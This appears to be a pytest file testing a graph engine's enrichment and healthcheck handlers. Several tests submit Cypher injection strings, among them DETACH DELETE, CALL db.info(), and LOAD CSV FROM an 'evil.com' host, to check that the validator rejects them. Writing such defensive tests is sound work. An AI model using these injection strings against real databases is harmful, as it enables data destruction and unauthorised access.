"""
--- L9_META ---
l9_schema: 1
origin: engine-specific
engine: graph
layer: [test]
tags: [test, enrich]
owner: engine-team
status: active
--- /L9_META ---

Tests for handle_enrich and handle_healthcheck handlers.
Covers SHIP-17: handler test coverage for enrich and healthcheck.
"""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock

import pytest

from engine.handlers import (
    ValidationError,
    handle_enrich,
    handle_healthcheck,
    init_dependencies,
)


def _make_domain_spec() -> MagicMock:
    """Create a minimal mock domain spec for enrich tests."""
    spec = MagicMock()
    spec.domain.id = "test_domain"
    spec.domain.name = "Test"
    spec.domain.version = "1.0"
    spec.compliance = None
    return spec


@pytest.fixture(autouse=True)
def _inject_deps() -> None:
    """Inject mock dependencies for all tests in this module."""
    mock_driver = AsyncMock()
    mock_driver.execute_query = AsyncMock(return_value=[{"enriched_count": 5}])
    mock_loader = MagicMock()
    mock_loader.load_domain = MagicMock(return_value=_make_domain_spec())
    init_dependencies(mock_driver, mock_loader)


class TestHandleEnrich:
    """Tests for handle_enrich handler."""

    @pytest.mark.asyncio
    async def test_enrich_success(self) -> None:
        """Enrich with valid expression returns success."""
        result = await handle_enrich(
            "test_tenant",
            {
                "entity_type": "Facility",
                "enrichments": [
                    {"property": "computed_score", "expression": "n.base_score * 1.5"},
                ],
            },
        )
        assert result["enriched_count"] == 5
        assert result["entity_type"] == "Facility"
        assert result["tenant"] == "test_tenant"

    @pytest.mark.asyncio
    async def test_enrich_with_entity_ids(self) -> None:
        """Enrich specific entities by ID."""
        result = await handle_enrich(
            "test_tenant",
            {
                "entity_type": "Facility",
                "entity_ids": ["F1", "F2", "F3"],
                "enrichments": [
                    {"property": "status", "expression": "n.active"},
                ],
            },
        )
        assert result["enriched_count"] == 5
        assert result["entity_type"] == "Facility"

    @pytest.mark.asyncio
    async def test_enrich_empty_enrichments(self) -> None:
        """Empty enrichments list returns zero count without error."""
        result = await handle_enrich(
            "test_tenant",
            {
                "entity_type": "Facility",
                "enrichments": [],
            },
        )
        assert result["enriched_count"] == 0

    @pytest.mark.asyncio
    async def test_enrich_missing_entity_type(self) -> None:
        """Missing entity_type raises ValidationError."""
        with pytest.raises(ValidationError, match="entity_type"):
            await handle_enrich(
                "test_tenant",
                {
                    "enrichments": [
                        {"property": "x", "expression": "n.y"},
                    ],
                },
            )

    @pytest.mark.asyncio
    async def test_enrich_injection_blocked_union(self) -> None:
        """UNION keyword in expression is blocked."""
        with pytest.raises(ValidationError, match="[Ff]orbidden"):
            await handle_enrich(
                "test_tenant",
                {
                    "entity_type": "Facility",
                    "enrichments": [
                        {"property": "x", "expression": "n.y UNION MATCH (m) RETURN m"},
                    ],
                },
            )

    @pytest.mark.asyncio
    async def test_enrich_injection_blocked_delete(self) -> None:
        """DELETE keyword in expression is blocked."""
        with pytest.raises(ValidationError, match="[Ff]orbidden"):
            await handle_enrich(
                "test_tenant",
                {
                    "entity_type": "Facility",
                    "enrichments": [
                        {"property": "x", "expression": "n.y}} DELETE n //"},
                    ],
                },
            )

    @pytest.mark.asyncio
    async def test_enrich_injection_blocked_call(self) -> None:
        """CALL keyword in expression is blocked."""
        with pytest.raises(ValidationError, match="[Ff]orbidden"):
            await handle_enrich(
                "test_tenant",
                {
                    "entity_type": "Facility",
                    "enrichments": [
                        {"property": "x", "expression": "CALL db.info() YIELD name"},
                    ],
                },
            )

    @pytest.mark.asyncio
    async def test_enrich_injection_blocked_merge(self) -> None:
        """MERGE keyword in expression is blocked."""
        with pytest.raises(ValidationError, match="[Ff]orbidden"):
            await handle_enrich(
                "test_tenant",
                {
                    "entity_type": "Facility",
                    "enrichments": [
                        {"property": "x", "expression": "n.y}} MERGE (evil:Node)"},
                    ],
                },
            )

    @pytest.mark.asyncio
    async def test_enrich_injection_blocked_load_csv(self) -> None:
        """LOAD CSV in expression is blocked."""
        with pytest.raises(ValidationError, match="[Ff]orbidden"):
            await handle_enrich(
                "test_tenant",
                {
                    "entity_type": "Facility",
                    "enrichments": [
                        {"property": "x", "expression": "LOAD CSV FROM 'http://evil.com'"},
                    ],
                },
            )

    @pytest.mark.asyncio
    async def test_enrich_injection_blocked_detach(self) -> None:
        """DETACH keyword in expression is blocked."""
        with pytest.raises(ValidationError, match="[Ff]orbidden"):
            await handle_enrich(
                "test_tenant",
                {
                    "entity_type": "Facility",
                    "enrichments": [
                        {"property": "x", "expression": "n.y}} DETACH DELETE n"},
                    ],
                },
            )

    @pytest.mark.asyncio
    async def test_enrich_valid_function_expression(self) -> None:
        """Valid Cypher functions in expressions are allowed."""
        result = await handle_enrich(
            "test_tenant",
            {
                "entity_type": "Facility",
                "enrichments": [
                    {"property": "upper_name", "expression": "toUpper(n.name)"},
                    {"property": "score", "expression": "coalesce(n.score, 0)"},
                    {"property": "combined", "expression": "n.a + n.b"},
                ],
            },
        )
        assert result["enriched_count"] == 5

    @pytest.mark.asyncio
    async def test_enrich_parameter_expression(self) -> None:
        """Expressions using parameters ($) are allowed."""
        result = await handle_enrich(
            "test_tenant",
            {
                "entity_type": "Facility",
                "enrichments": [
                    {"property": "status", "expression": "$default_status"},
                ],
            },
        )
        assert result["enriched_count"] == 5

    @pytest.mark.asyncio
    async def test_enrich_expression_must_reference_node(self) -> None:
        """Expression without n. or $ reference is rejected."""
        with pytest.raises(ValidationError, match="does not match allowed patterns"):
            await handle_enrich(
                "test_tenant",
                {
                    "entity_type": "Facility",
                    "enrichments": [
                        {"property": "x", "expression": "1 + 2"},
                    ],
                },
            )

    @pytest.mark.asyncio
    async def test_enrich_multiple_enrichments(self) -> None:
        """Multiple enrichments in single call."""
        result = await handle_enrich(
            "test_tenant",
            {
                "entity_type": "Facility",
                "enrichments": [
                    {"property": "prop1", "expression": "n.a"},
                    {"property": "prop2", "expression": "n.b"},
                    {"property": "prop3", "expression": "n.c + n.d"},
                ],
            },
        )
        assert result["enriched_count"] == 5


class TestHandleHealthcheck:
    """Tests for handle_healthcheck handler (alias for handle_health)."""

    @pytest.mark.asyncio
    async def test_healthcheck_returns_health(self) -> None:
        """healthcheck delegates to health handler."""
        result = await handle_healthcheck("test_tenant", {})
        assert result["status"] == "healthy"
        assert "checks" in result
        assert result["checks"]["neo4j"] == "ok"
        assert result["checks"]["domain_spec"] == "ok"

    @pytest.mark.asyncio
    async def test_healthcheck_degraded_on_neo4j_failure(self) -> None:
        """healthcheck returns degraded when Neo4j fails."""
        from engine.handlers import _graph_driver

        _graph_driver.execute_query = AsyncMock(side_effect=ConnectionError("refused"))
        result = await handle_healthcheck("test_tenant", {})
        assert result["status"] == "degraded"
        assert "error" in result["checks"]["neo4j"]
